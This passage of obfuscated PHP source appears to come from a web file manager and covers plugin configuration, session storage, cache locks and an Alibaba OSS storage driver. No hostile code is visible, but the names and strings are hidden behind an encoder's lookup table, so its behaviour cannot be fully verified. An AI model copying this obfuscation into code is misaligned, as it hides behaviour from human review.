(!$Ï“×ô’Í || $Á†˜—§Ğ) { $Ï“×ô’Í = $this->getConfigDefault($ñ¶›‡¢); } return $Ï“×ô’Í; } public function setConfig($ ±„Ö¬‘, $êéò–´¡ = false) { $ŠôŸ¼± =& $_SERVER[”øäÃÍª]; $•«˜¦» = $this->loadList($ ±„Ö¬‘); if (!$•«˜¦») { return !1; } $ˆ­÷ë¾‚ = $•«˜¦»[$ŠôŸ¼±[6]]; if ($êéò–´¡ == !1) { $ˆ­÷ë¾‚ = array(); $êéò–´¡ = $this->getConfigDefault($ ±„Ö¬‘); } foreach ($êéò–´¡ as $±È¶¥Î => $ÔÄ¹ş¹é) { $ˆ­÷ë¾‚[$±È¶¥Î] = is_string($ÔÄ¹ş¹é) ? trim($ÔÄ¹ş¹é) : $ÔÄ¹ş¹é; } $this->update($•«˜¦»[$ŠôŸ¼±[487]], array($ŠôŸ¼±[6] => $ˆ­÷ë¾‚)); } public function viewList() { $’™¹Õ¼ =& $_SERVER[”øäÃÍª]; $ÑÜÁôğö = $this->loadList(); $this->pluginScan($ÑÜÁôğö); $ÑÜÁôğö = $this->loadPluginList(); $¤ğî‡® = array(); foreach ($ÑÜÁôğö as $Ö®İ£ø· => $öò•²á½) { $š†¯Ã½± = $öò•²á½; unset($öò•²á½[$’™¹Õ¼[2261]], $öò•²á½[$’™¹Õ¼[6]]); $ñ¤ê«¦… = PLUGIN_DIR . $öò•²á½[$’™¹Õ¼[32]] . $’™¹Õ¼[2263]; if (!is_file($ñ¤ê«¦…)) { continue; } $Ï–œôå¶ = Hook::apply($öò•²á½[$’™¹Õ¼[32]] . $’™¹Õ¼[2271]); if (!is_array($Ï–œôå¶)) { continue; } $¤ğî‡®[$Ö®İ£ø·] = array_merge($öò•²á½, $Ï–œôå¶); if ($š†¯Ã½±[$’™¹Õ¼[6]][$’™¹Õ¼[1844]] != $Ï–œôå¶[$’™¹Õ¼[1818]]) { Hook::apply($öò•²á½[$’™¹Õ¼[32]] . $’™¹Õ¼[2268]); $š†¯Ã½±[$’™¹Õ¼[6]][$’™¹Õ¼[1844]] = $Ï–œôå¶[$’™¹Õ¼[1818]]; $this->update($öò•²á½[$’™¹Õ¼[487]], array($’™¹Õ¼[6] => $š†¯Ã½±[$’™¹Õ¼[6]])); } } return $¤ğî‡®; } private function loadPluginList() { $“‚§ôŸ¾ =& $_SERVER[”øäÃÍª]; $„±šäíª = $this->loadList(); if (strtolower(MOD) == $“‚§ôŸ¾[2272]) { return $„±šäíª; } $²Í€Øòô = Hook::trigger($“‚§ôŸ¾[2273], $„±šäíª); if ($„±šäíª && !$²Í€Øòô) { die; } return $²Í€Øòô ? $²Í€Øòô : $„±šäíª; } private function pluginScan($¨ªäÄá…) { $òÈêœ·ô =& $_SERVER[”øäÃÍª]; recursion_dir(PLUGIN_DIR, $ÔÍ‡¬“, $¨ÕíÙÏ¨, 0); foreach ($ÔÍ‡¬“ as $·Ô…ÂµÃ) { $¹½ŠèĞó = get_path_this($·Ô…ÂµÃ); if (isset($¨ªäÄá…[$¹½ŠèĞó]) || !file_exists($·Ô…ÂµÃ . $òÈêœ·ô[2274]) || !file_exists($·Ô…ÂµÃ . $òÈêœ·ô[2263])) { continue; } Hook::apply($¹½ŠèĞó . $òÈêœ·ô[2268]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\137\163\145\163\163\x69\157\156"; public function get($üí·¢ã¨) { $•èİËÄ =& $_SERVER[”øäÃÍª]; $ÅÁ£ûâÆ = $this->where(array($•èİËÄ[2275] => $üí·¢ã¨))->find(); if (!is_array($ÅÁ£ûâÆ)) { return !1; } return $ÅÁ£ûâÆ[$•èİËÄ[168]]; } public function set($§æí»ù, $ƒë¶¶ùğ, $‘Ã´€¢Ÿ = 3600) { $ˆïÜ€¾ª =& $_SERVER[”øäÃÍª]; $Ëãé°›ˆ = array($ˆïÜ€¾ª[2275] => $§æí»ù, $ˆïÜ€¾ª[2178] => $ƒë¶¶ùğ, $ˆïÜ€¾ª[2276] => $‘Ã´€¢Ÿ + time()); if (Session::get($ˆïÜ€¾ª[2277])) { $Ëãé°›ˆ[$ˆïÜ€¾ª[1548]] = Session::get($ˆïÜ€¾ª[2277]); } else { $Ëãé°›ˆ[$ˆïÜ€¾ª[1548]] = 0; } if ($this->get($§æí»ù)) { return $this->where(array($ˆïÜ€¾ª[2275] => $§æí»ù))->save($Ëãé°›ˆ); } else { return $this->add($Ëãé°›ˆ, array(), !0); } } public function remove($ÅŸíş™) { return $this->where(array($_SERVER[”øäÃÍª][2275] => $ÅŸíş™))->delete(); } public function clearTimeout() { return $this->where($_SERVER[”øäÃÍª][2278] . time())->delete(); } } goto fôùÒÃ±››; FÊ™À«âˆá: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $•““ÓæØ =& $_SERVER[”øäÃÍª]; if (self::$handle) { return self::$handle; } $¹¬ö¤Ü„ = $GLOBALS[$•““ÓæØ[6]][$•““ÓæØ[424]]; self::$timeout = $¹¬ö¤Ü„[$•““ÓæØ[960]] ? $¹¬ö¤Ü„[$•““ÓæØ[960]] : 10; $ÊÛ• = _get($GLOBALS[$•““ÓæØ[6]], $•““ÓæØ[961]); $£ºêü¹ğ = $¹¬ö¤Ü„[$•““ÓæØ[943]] ? $¹¬ö¤Ü„[$•““ÓæØ[943]] : $•““ÓæØ[230]; if ($£ºêü¹ğ == $•““ÓæØ[21] && $ÊÛ• == $•““ÓæØ[13]) { $£ºêü¹ğ = $•““ÓæØ[230]; } switch ($£ºêü¹ğ) { case $•““ÓæØ[946]: self::$handle = new CacheLockRedis(); break; case $•““ÓæØ[947]: self::$handle = new CacheLockMemcached(); break; case $•““ÓæØ[21]: self::$handle = new CacheLockDatabase(); break; case $•““ÓæØ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($•““ÓæØ[962], $•““ÓæØ[963]); } return self::$handle; } private static function key($ı­Í è) { return $_SERVER[”øäÃÍª][964] . Cache::key($ı­Í è); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¦äŒÑÄÛ = '') { self::$errorMsg = $¦äŒÑÄÛ; } public static function lockGlobal($‹İÏİ—è, $ü¢¨Á®) { return self::lock($‹İÏİ—è, $ü¢¨Á®, !0); } public static function lock($äÂİîË, $½Â‚ì  = false, $ëàØü¹– = false) { $¶Õ¼“£õ =& $_SERVER[”øäÃÍª]; $ ‘²ÂÓÉ = self::init(); $Í×‹ˆÏå = self::key($äÂİîË); $½Â‚ì  = $½Â‚ì  ? $½Â‚ì  : self::$timeout; $¢½úğä… = timeFloat(); if (_get($GLOBALS, $¶Õ¼“£õ[965], !1)) { if (!$ ‘²ÂÓÉ->lock($Í×‹ˆÏå, 0.2)) { die; } return !0; } $È´÷Ãâö = $ ‘²ÂÓÉ->lock($Í×‹ˆÏå, $½Â‚ì ); $ŒØûêŸâ = timeFloat(); if (!$È´÷Ãâö) { $îóØÏ§à = "\x6c\x6f\143\153\x20\145\162\x72\x6f\162\x3b\x6b\145\171\x3d{$äÂİîË}\73\164\x69\155\145\75{$½Â‚ì }\x3b" . self::$errorMsg . $¶Õ¼“£õ[74] . get_caller_msg(); $ºèß”´ = LNG($¶Õ¼“£õ[966]) . "\50{$½Â‚ì }\x73\x29\56" . LNG($¶Õ¼“£õ[967]); $ºèß”´ .= $¶Õ¼“£õ[968]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ºèß”´ = $ºèß”´ . $¶Õ¼“£õ[969] . self::$errorMsg; } write_log($¶Õ¼“£õ[970] . sprintf($¶Õ¼“£õ[971], timeFloat() - $¢½úğä…) . $¶Õ¼“£õ[972] . $îóØÏ§à . $¶Õ¼“£õ[973] . json_encode(error_get_last()), $¶Õ¼“£õ[963]); show_json($ºèß”´, !1); } if (!$ëàØü¹–) { self::$lockItem[$Í×‹ˆÏå] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‡ĞûÓ¨’ = number_format(timeFloat() - $ŒØûêŸâ, 3); write_log($¶Õ¼“£õ[974] . $äÂİîË . $¶Õ¼“£õ[975] . $‡ĞûÓ¨’, $¶Õ¼“£õ[963]); } return $È´÷Ãâö; } public static function lockGet($¹ÚıèÌ) { $ğ¬ˆ£ó = self::key($¹ÚıèÌ); if (self::$lockItem[$ğ¬ˆ£ó]) { return self::$lockItem[$ğ¬ˆ£ó]; } return self::init()->lockGet($ğ¬ˆ£ó); } public static function unlock($ÚÈ²ç™) { $””ŸØê³ =& $_SERVER[”øäÃÍª]; $ùºÓ³¶ = self::key($ÚÈ²ç™); self::$lockItem[$ùºÓ³¶] = null; self::init()->unlock($ùºÓ³¶); if (GLOBAL_DEBUG_LOG_ALL) { write_log($””ŸØê³[976] . $ÚÈ²ç™, $””ŸØê³[963]); } return; } public static function unlockRuntime() { $Åüõìî =& $_SERVER[”øäÃÍª]; $ê‡ˆõ”© = self::init(); $çùÊá¼» = !1; foreach (self::$lockItem as $ÅÄÛÑõ‹ => $¶Ó¼ß¸ˆ) { if (!$¶Ó¼ß¸ˆ) { continue; } $ê‡ˆõ”©->unlock($ÅÄÛÑõ‹); if (!$çùÊá¼») { $çùÊá¼» = !0; write_log($Åüõìî[977] . $ÅÄÛÑõ‹ . $Åüõìî[74] . get_caller_msg(), $Åüõìî[963]); continue; } write_log($Åüõìî[977] . $ÅÄÛÑõ‹, $Åüõìî[963]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $—óú¡şÑ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Åüõìî[978] . $—óú¡şÑ . $Åüõìî[979] . ACTION, $Åüõìî[963]); } } public static function fileLock($÷¥„®Ñ) { $È§¡¼ÚÌ =& $_SERVER[”øäÃÍª]; if (!$GLOBALS[$È§¡¼ÚÌ[980]]) { $GLOBALS[$È§¡¼ÚÌ[980]] = array(); } $GLOBALS[$È§¡¼ÚÌ[980]][$÷¥„®Ñ] = !1; $ŸĞ¦©¹  = fopen(DATA_PATH . $÷¥„®Ñ . $È§¡¼ÚÌ[981], $È§¡¼ÚÌ[982]); if (!$ŸĞ¦©¹ ) { return !1; } $GLOBALS[$È§¡¼ÚÌ[980]][$÷¥„®Ñ] = $ŸĞ¦©¹ ; if (flock($ŸĞ¦©¹ , LOCK_EX)) { return !0; } self::unlock($÷¥„®Ñ); show_json($È§¡¼ÚÌ[983], !1); return !1; } public static function fileUnlock($ËĞ¼”Ÿ³) { $Ãå©ÕÁ¼ =& $_SERVER[”øäÃÍª]; $ —…±Öã = $GLOBALS[$Ãå©ÕÁ¼[980]][$ËĞ¼”Ÿ³]; if (!$ —…±Öã) { return; } $GLOBALS[$Ãå©ÕÁ¼[980]][$ËĞ¼”Ÿ³] = !1; flock($ —…±Öã, LOCK_UN); fclose($ —…±Öã); } public static function fileUnlockAll() { $ëø‘­É« =& $_SERVER[”øäÃÍª]; if (!isset($GLOBALS[$ëø‘­É«[980]]) || !$GLOBALS[$ëø‘­É«[980]]) { return; } foreach ($GLOBALS[$ëø‘­É«[980]] as $±ü¬óªì => $°ÒË÷é) { if (!$°ÒË÷é) { continue; } $GLOBALS[$ëø‘­É«[980]][$±ü¬óªì] = !1; flock($°ÒË÷é, LOCK_UN); fclose($°ÒË÷é); } $GLOBALS[$ëø‘­É«[980]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $óñ½¶¥‚ =& $_SERVER[”øäÃÍª]; $Ø‘¡á¸Œ = $GLOBALS[$óñ½¶¥‚[6]][$óñ½¶¥‚[424]]; self::$cachePath = $Ø‘¡á¸Œ[$óñ½¶¥‚[230]][$óñ½¶¥‚[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÛĞöÅÇ˜, $½®­˜¬÷ = 0) { $—ÏñÓ€ =& $_SERVER[”øäÃÍª]; $­¤ñÏ–è = microtime(!0); $Şû¢„¤® = $­¤ñÏ–è + $½®­˜¬÷ + 0.0001; $ª’Ğâğó = rtrim(self::$cachePath, $—ÏñÓ€[8]) . $—ÏñÓ€[984] . md5($ÛĞöÅÇ˜) . $—ÏñÓ€[981]; if (file_exists($ª’Ğâğó) && filemtime($ª’Ğâğó) && filemtime($ª’Ğâğó) < time() - 10) { @unlink($ª’Ğâğó); } do { if (file_exists($ª’Ğâğó)) { cacheLockWait(); continue; } $¯†ŠÈß  = fopen($ª’Ğâğó, $—ÏñÓ€[985]); if (!$¯†ŠÈß ) { return !1; } $˜‘–Ê€ = flock($¯†ŠÈß , LOCK_EX | LOCK_NB); self::$caches[$ÛĞöÅÇ˜] = array($—ÏñÓ€[986] => $¯†ŠÈß , $—ÏñÓ€[230] => $ª’Ğâğó); fwrite($¯†ŠÈß , $Şû¢„¤®); clearstatcache(); if ($¯†ŠÈß  && $˜‘–Ê€) { return !0; } cacheLockWait(); } while (microtime(!0) < $Şû¢„¤®); $this->unlock($ÛĞöÅÇ˜); return !1; } public function lockGet($ï¢¡ùÔ€) { $ª²ƒï‰€ =& $_SERVER[”øäÃÍª]; $İœ«’ûã = rtrim(self::$cachePath, $ª²ƒï‰€[8]) . $ª²ƒï‰€[984] . md5($ï¢¡ùÔ€) . $ª²ƒï‰€[981]; return file_exists($İœ«’ûã); } public function unlock($³ïæåŒ ) { $É½¬Šøº =& $_SERVER[”øäÃÍª]; $ıİµ×ø = self::$caches[$³ïæåŒ ]; if (!$ıİµ×ø) { return; } @flock($ıİµ×ø[$É½¬Šøº[986]], LOCK_UN); @fclose($ıİµ×ø[$É½¬Šøº[986]]); @unlink($ıİµ×ø[$É½¬Šøº[230]]); unset(self::$caches[$³ïæåŒ ]); } } goto aÙƒáñê¶´; cšÅÕõÑÇ¹: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($õ½ ®§è) { parent::__construct(); include_once SDK_DIR . $_SERVER[”øäÃÍª][1625]; $this->_init($õ½ ®§è); } public function _init($ÀÃÎğ´ú) { $ù†Ï×ü² =& $_SERVER[”øäÃÍª]; $this->config = $ÀÃÎğ´ú; foreach ($ÀÃÎğ´ú as $ä»™–‘Í => $ŒÄ®˜) { if (isset($this->{$ä»™–‘Í})) { $this->{$ä»™–‘Í} = $ŒÄ®˜; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ù†Ï×ü²[1626] . LNG($ù†Ï×ü²[1627])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ŠöÛµÃ =& $_SERVER[”øäÃÍª]; $ßÕö€—  = new OSS\Model\CorsConfig(); $† ç™åÆ = new OSS\Model\CorsRule(); $† ç™åÆ->addAllowedOrigin($ŠöÛµÃ[1628]); $† ç™åÆ->addAllowedMethod($ŠöÛµÃ[1629]); $† ç™åÆ->addAllowedMethod($ŠöÛµÃ[1630]); $† ç™åÆ->addAllowedMethod($ŠöÛµÃ[1631]); $† ç™åÆ->addAllowedMethod($ŠöÛµÃ[1632]); $† ç™åÆ->addAllowedMethod($ŠöÛµÃ[162]); $† ç™åÆ->setMaxAgeSeconds(600); $† ç™åÆ->addExposeHeader($ŠöÛµÃ[1633]); $† ç™åÆ->addAllowedHeader($ŠöÛµÃ[1628]); $ßÕö€— ->addRule($† ç™åÆ); try { $this->client->putBucketCors($this->bucket, $ßÕö€— ); } catch (OSS\Core\OssException $¨†õ›ì¯) { $this->writeLog(__FUNCTION__ . $ŠöÛµÃ[212] . $¨†õ›ì¯->getMessage()); return !1; } return !0; } public function getBucketCors() { $Ôúüó¬ü =& $_SERVER[”øäÃÍª]; $“®œÎ»Î = null; try { $“®œÎ»Î = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Øôıà‹Ş) { $this->writeLog(__FUNCTION__ . $Ôúüó¬ü[212] . $Øôıà‹Ş->getMessage()); return null; } if (!$“®œÎ»Î || !($õ‚Ñ è­ = $“®œÎ»Î->getRules())) { return null; } $à„ÌÅ³Â = $õ‚Ñ è­[0]->getAllowedOrigins(); $Š©ù©õ¹ = $õ‚Ñ è­[0]->getAllowedMethods(); $ÏÛ›êû€ = $õ‚Ñ è­[0]->getMaxAgeSeconds(); $ûœ¥¥Õß = $õ‚Ñ è­[0]->getExposeHeaders(); $‡Ú—Ê˜± = $õ‚Ñ è­[0]->getAllowedHeaders(); return array($Ôúüó¬ü[218] => isset($à„ÌÅ³Â[0]) ? $à„ÌÅ³Â[0] : $Ôúüó¬ü[12], $Ôúüó¬ü[222] => $Š©ù©õ¹, $Ôúüó¬ü[1634] => $ÏÛ›êû€, $Ôúüó¬ü[1635] => isset($ûœ¥¥Õß[0]) ? $ûœ¥¥Õß[0] : $Ôúüó¬ü[12], $Ôúüó¬ü[219] => isset($‡Ú—Ê˜±[0]) ? $‡Ú—Ê˜±[0] : $Ôúüó¬ü[12]); } public function isBucketCors() { $ğŠÇ¸”õ =& $_SERVER[”øäÃÍª]; $“Ø ™“Ğ = $this->getBucketCors(); if (!$“Ø ™“Ğ || !is_array($“Ø ™“Ğ)) { return !1; } if ($“Ø ™“Ğ[$ğŠÇ¸”õ[218]] != $ğŠÇ¸”õ[220] || $“Ø ™“Ğ[$ğŠÇ¸”õ[219]] != $ğŠÇ¸”õ[220]) { return !1; } $úº­µ…Æ = array_map($ğŠÇ¸”õ[221], $“Ø ™“Ğ[$ğŠÇ¸”õ[222]]); if (!is_array($úº­µ…Æ)) { $úº­µ…Æ = array(); } $«ü›È¢ß = array($ğŠÇ¸”õ[223], $ğŠÇ¸”õ[224], $ğŠÇ¸”õ[225], $ğŠÇ¸”õ[226], $ğŠÇ¸”õ[227]); $Æ†¾Ú‡ = array_diff($«ü›È¢ß, $úº­µ…Æ); return empty($Æ†¾Ú‡); } public function mkfile($øÍî÷½ª, $ë±¢ÅãÀ = '', $ÍíãÉ£¤ = REPEAT_RENAME) { $ªÒùŸäÑ = $this->setContent($øÍî÷½ª, $ë±¢ÅãÀ); if ($ªÒùŸäÑ !== !1) { return $this->getPathOuter($øÍî÷½ª); } return !1; } public function mkdir($ğÀÎÁ‹†, $õÓ°©Å = REPEAT_SKIP) { if ($õÓ°©Å && $this->_isFolder($ğÀÎÁ‹†)) { return $this->getPathOuter($ğÀÎÁ‹†); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ğÀÎÁ‹†)); } catch (OSS\Core\OssException $Ü¬ÊÊŠ•) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $Ü¬ÊÊŠ•->getMessage()); return !1; } return $this->getPathOuter($ğÀÎÁ‹†); } private function fileList($©Ü ªëÅ, $µâÆ¸ = '', $í“ãáÈ– = 0) { $¤‚À¹¹Â =& $_SERVER[”øäÃÍª]; $©Ü ªëÅ = trim($©Ü ªëÅ, $¤‚À¹¹Â[8]); $¢ÃÎ‡ş = empty($©Ü ªëÅ) && $©Ü ªëÅ !== $¤‚À¹¹Â[228] ? $¤‚À¹¹Â[12] : $©Ü ªëÅ . $¤‚À¹¹Â[8]; $Ñ¥™Çï‚ = $¤‚À¹¹Â[12]; $˜Áò¾Â¡ = 1000; $»õæÄ… = $ÃÔ«â°Ï = array(); while (!0) { check_abort(); $ÙáŒ­¶ = array($¤‚À¹¹Â[1636] => $µâÆ¸, $¤‚À¹¹Â[1637] => $¢ÃÎ‡ş, $¤‚À¹¹Â[1638] => $˜Áò¾Â¡, $¤‚À¹¹Â[1639] => $Ñ¥™Çï‚); try { $ˆ¤Ğ®Ä = $this->client->listObjects($this->bucket, $ÙáŒ­¶); } catch (OSS\Core\OssException $½ùåµç) { $this->writeLog(__FUNCTION__ . $¤‚À¹¹Â[212] . $½ùåµç->getMessage()); break; } $Ñ¥™Çï‚ = $ˆ¤Ğ®Ä->getNextMarker(); $‡«¯ÉŠ = $ˆ¤Ğ®Ä->getObjectList(); $Î ‘Üˆ­ = $ˆ¤Ğ®Ä->getPrefixList(); foreach ($‡«¯ÉŠ as $…úÄ¯Ş’) { if ($…úÄ¯Ş’->getKey() == $¢ÃÎ‡ş) { continue; } $’—²ŞËò = $…úÄ¯Ş’->getKey(); $¿óÁÖ²× = $…úÄ¯Ş’->getSize(); $•Ù„ôÒÛ = $…úÄ¯Ş’->getLastModified(); $Ü¼‹‰Œ = trim($…úÄ¯Ş’->getETag(), $¤‚À¹¹Â[118]); $‰‹Ä¶ó = $í“ãáÈ– ? array($¤‚À¹¹Â[32] => $’—²ŞËò, $¤‚À¹¹Â[79] => $¿óÁÖ²×, $¤‚À¹¹Â[204] => strtotime($•Ù„ôÒÛ), $¤‚À¹¹Â[1640] => $Ü¼‹‰Œ) : $’—²ŞËò; $­öÌŒù¸ = $¿óÁÖ²× == 0 && substr($’—²ŞËò, strlen($’—²ŞËò) - 1, 1) == $¤‚À¹¹Â[8] ? !0 : !1; $„í“İƒŞ = array($¤‚À¹¹Â[79] => $¿óÁÖ²×, $¤‚À¹¹Â[1641] => $¿óÁÖ²×, $¤‚À¹¹Â[88] => strtotime($•Ù„ôÒÛ), $¤‚À¹¹Â[1642] => $•Ù„ôÒÛ, $¤‚À¹¹Â[1640] => $Ü¼‹‰Œ); $this->cacheMethodInfoSet($’—²ŞËò, $­öÌŒù¸, $„í“İƒŞ); if ($­öÌŒù¸) { $»õæÄ…[] = $’—²ŞËò; continue; } $ÃÔ«â°Ï[] = $‰‹Ä¶ó; } foreach ($Î ‘Üˆ­ as $ìøç—üƒ) { $»õæÄ…[] = $ìøç—üƒ->getPrefix(); $this->cacheMethodInfoSet($ìøç—üƒ->getPrefix(), !0); } if ($Ñ¥™Çï‚ === $¤‚À¹¹Â[12]) { break; } } $this->cacheMethodInfoSet($©Ü ªëÅ, !0); return array($¤‚À¹¹Â[85] => $»õæÄ…, $¤‚À¹¹Â[86] => $ÃÔ«â°Ï); } public function listObject($Ä—ÔºœÊ, $§öÉææ¦ = '') { $Ì×±‰çÍ =& $_SERVER[”øäÃÍª]; $Ä—ÔºœÊ = trim($Ä—ÔºœÊ, $Ì×±‰çÍ[8]); $õäâ = empty($Ä—ÔºœÊ) && $Ä—ÔºœÊ !== $Ì×±‰çÍ[228] ? $Ì×±‰çÍ[12] : $Ä—ÔºœÊ . $Ì×±‰çÍ[8]; $°Ê¢ÇÊŠ = $Ì×±‰çÍ[12]; $Ê–Û¾òß = 1000; $š·»½Ì™ = $øÇ›¼³  = array(); while (!0) { check_abort(); $µçÜºâœ = array($Ì×±‰çÍ[1636] => $§öÉææ¦, $Ì×±‰çÍ[1637] => $õäâ, $Ì×±‰çÍ[1638] => $Ê–Û¾òß, $Ì×±‰çÍ[1639] => $°Ê¢ÇÊŠ); try { $ï±÷©À = $this->client->listObjects($this->bucket, $µçÜºâœ); } catch (OSS\Core\OssException $…·¹€áå) { $this->writeLog(__FUNCTION__ . $Ì×±‰çÍ[212] . $…·¹€áå->getMessage()); break; } $°Ê¢ÇÊŠ = $ï±÷©À->getNextMarker(); $•ÇáÔƒ• = $ï±÷©À->getObjectList(); foreach ($•ÇáÔƒ• as $òÜÔ®¤) { if ($òÜÔ®¤->getKey() == $õäâ) { continue; } $ÁŸª–ÍÔ = $òÜÔ®¤->getKey(); $–Ò¼õ‘¾ = $òÜÔ®¤->getSize(); $¡èÎŸÏÄ = $–Ò¼õ‘¾ == 0 && substr($ÁŸª–ÍÔ, strlen($ÁŸª–ÍÔ) - 1, 1) == $Ì×±‰çÍ[8] ? !0 : !1; if ($¡èÎŸÏÄ) { continue; } $øÇ›¼³ [] = $–Ò¼õ‘¾ . $Ì×±‰çÍ[212] . $ÁŸª–ÍÔ; } if ($°Ê¢ÇÊŠ === $Ì×±‰çÍ[12]) { break; } } return array($Ì×±‰çÍ[85] => $š·»½Ì™, $Ì×±‰çÍ[86] => $øÇ›¼³ ); } public function copyFile($¶ÅËÀ, $Û›Ü’®õ) { $´¾¡èşø = $this->size($¶ÅËÀ); if ($´¾¡èşø < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¶ÅËÀ, $this->bucket, $this->pathEncode($Û›Ü’®õ)); } catch (OSS\Core\OssException $âî¿àŞº) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $âî¿àŞº->getMessage()); return !1; } return $this->getPathOuter($Û›Ü’®õ); } $™èœÀâ¯ = $this->multiCopyObject($¶ÅËÀ, $Û›Ü’®õ, $´¾¡èşø); return $™èœÀâ¯ ? $this->getPathOuter($Û›Ü’®õ) : !1; } private function multiCopyObject($…•ç›üæ, $ºÎ³·³ , $™™¼Àíæ) { $ùš…¤¹ =& $_SERVER[”øäÃÍª]; try { $êËğ¾€Ó = array(); if ($‘…É•‘Ô = $this->hashMd5($…•ç›üæ)) { $êËğ¾€Ó = array(OSS\OssClient::OSS_HEADERS => array($ùš…¤¹[1643] => $‘…É•‘Ô)); } $äù©ùä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ºÎ³·³ ), $êËğ¾€Ó); $øİ¨Œ´İ = 1; $±»‰’†§ = 0; $°—ı¯Ç¦ = array(); $œùÉÖ–è = 1024 * 1024 * 10; $°ºÀ²¶ó = $this->client->generateMultiuploadParts($™™¼Àíæ, $œùÉÖ–è); foreach ($°ºÀ²¶ó as $¡”±”„¼ => $­ÉÉâ¯£) { $­¨‹»¿Ü = $±»‰’†§ + (int) $­ÉÉâ¯£[$ùš…¤¹[1644]]; $µÓ¤æ¢Ï = (int) $­ÉÉâ¯£[$ùš…¤¹[412]] + $­¨‹»¿Ü - 1; $¾úÑ®öÓ = array($ùš…¤¹[164] => $­¨‹»¿Ü, $ùš…¤¹[165] => $µÓ¤æ¢Ï); $°—ı¯Ç¦[] = $this->client->uploadPartCopy($this->bucket, $…•ç›üæ, $this->bucket, $this->pathEncode($ºÎ³·³ ), $øİ¨Œ´İ, $äù©ùä, $¾úÑ®öÓ); $øİ¨Œ´İ = $øİ¨Œ´İ + 1; } $äûßÚ÷ = array(); foreach ($°—ı¯Ç¦ as $¡”±”„¼ => $óÑşªï) { $äûßÚ÷[] = array($ùš…¤¹[297] => $¡”±”„¼ + 1, $ùš…¤¹[298] => $óÑşªï); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ºÎ³·³ ), $äù©ùä, $äûßÚ÷); } catch (OSS\Core\OssException $¡øç‹ß) { $this->writeLog(__FUNCTION__ . $ùš…¤¹[212] . $¡øç‹ß->getMessage()); return !1; } return !0; } public function moveFile($¯ú¹íé½, $£‹é‹ˆ…) { if ($this->copyFile($¯ú¹íé½, $£‹é‹ˆ…)) { $this->remove($¯ú¹íé½); return $this->getPathOuter($£‹é‹ˆ…); } return !1; } public function delFile($ıÑ«®ù) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ıÑ«®ù)); } catch (OSS\Core\OssException $§Ë¨ß—Î) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $§Ë¨ß—Î->getMessage()); return !1; } return !0; } public function delFolder($Ğò½“•Û) { $å§¶¿Üğ =& $_SERVER[”øäÃÍª]; if (!$this->exist($Ğò½“•Û)) { return !0; } $this->listItemCache = !1; $ÑÄ¸‚¡ = $this->fileList($Ğò½“•Û); $this->listItemCache = !0; $Ô÷ ÙÑñ = trim($Ğò½“•Û, $å§¶¿Üğ[8]) . $å§¶¿Üğ[8]; if (!empty($Ğò½“•Û) && $Ğò½“•Û !== $å§¶¿Üğ[228] && !in_array($Ô÷ ÙÑñ, $ÑÄ¸‚¡[$å§¶¿Üğ[85]])) { $ÑÄ¸‚¡[$å§¶¿Üğ[85]][] = $Ô÷ ÙÑñ; } $“‘º›ñ = $this->delByBatch($ÑÄ¸‚¡[$å§¶¿Üğ[86]]); if (!$“‘º›ñ) { return !1; } $“‘º›ñ = $this->delByBatch($ÑÄ¸‚¡[$å§¶¿Üğ[85]]); if (!$“‘º›ñ) { return !1; } return $this->delFile($Ô÷ ÙÑñ); } private function delByBatch($Ã²‰¡Œ) { foreach (array_chunk($Ã²‰¡Œ, 1000) as $à¦Ò»™) { try { $this->client->deleteObjects($this->bucket, $à¦Ò»™); } catch (OSS\Core\OssException $¬·Ê¥) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $¬·Ê¥->getMessage()); return !1; } } return !0; } public function rename($õ¯ıØ†ö, $¬òÒ¾ƒö) { return $this->renameObject($õ¯ıØ†ö, $¬òÒ¾ƒö); } private function fileInfo($ÚÌÙ­À, $ÍíõïØ = false, $â áÎ½£ = array()) { $ÍÅ“Šîß =& $_SERVER[”øäÃÍª]; $ÇÄ‰°œ = array($ÍÅ“Šîß[32] => $this->pathThis($ÚÌÙ­À), $ÍÅ“Šîß[87] => $this->getPathOuter($ÚÌÙ­À), $ÍÅ“Šîß[33] => $ÍÅ“Šîß[230], $ÍÅ“Šîß[79] => isset($â áÎ½£[$ÍÅ“Šîß[79]]) ? $â áÎ½£[$ÍÅ“Šîß[79]] : 0, $ÍÅ“Šîß[166] => $this->ext($ÚÌÙ­À)); if ($ÍíõïØ) { return $ÇÄ‰°œ; } $ÇÄ‰°œ[$ÍÅ“Šîß[231]] = $ÇÄ‰°œ[$ÍÅ“Šîß[88]] = 0; $ÇÄ‰°œ[$ÍÅ“Šîß[232]] = $ÇÄ‰°œ[$ÍÅ“Šîß[233]] = !0; if (empty($â áÎ½£)) { $²ÑüÓìÖ = $this->objectMeta($ÚÌÙ­À); if (!$²ÑüÓìÖ) { return $ÇÄ‰°œ; } 